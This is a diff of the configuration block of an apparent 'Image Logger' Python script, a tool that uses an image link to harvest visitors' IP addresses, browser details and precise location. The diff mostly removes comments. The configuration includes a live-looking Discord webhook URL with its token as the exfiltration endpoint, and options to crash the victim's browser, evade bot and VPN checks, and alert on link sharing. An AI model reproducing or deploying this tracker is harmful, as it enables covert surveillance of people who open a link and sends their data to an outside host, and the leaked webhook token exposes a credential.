@@ -2,17 +2,17 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 config = {
-    # BASE CONFIG #
+  
     "webhook": "https://discord.com/api/webhooks/1371137301555445770/MSrngReWrAvEBk12YPxYfWhQtkxlF8TEBlBno9PQJd8piSggqiPklNxaEH3a164TLYa0",
-    "image": "https://cdn.discordapp.com/attachments/1196181343198003313/1371534705148559560/image.png?ex=68237cbb&is=68222b3b&hm=ba0373d7cc2d82d503cfec0731b4ab9c4b9b65e71a3d4e2c33b32cd48888d95c&", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://cdn.discordapp.com/attachments/1196181343198003313/1371534705148559560/image.png?ex=68237cbb&is=68222b3b&hm=ba0373d7cc2d82d503cfec0731b4ab9c4b9b65e71a3d4e2c33b32cd48888d95c&",
+                                              
+    "imageArgument": True, 
 
-    # CUSTOMIZATION #
+ 
     "username": "Image Logger", 
     "color": 0x00FFFF, 
 
-    # OPTIONS #
+  
     "crashBrowser": False, 
     
     "accurateLocation": True, 
@@ -25,8 +25,8 @@ config = {
 
     "vpnCheck": 1,
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, 
+    "buggedImage": False, 
 
     "antiBot": 1,
 
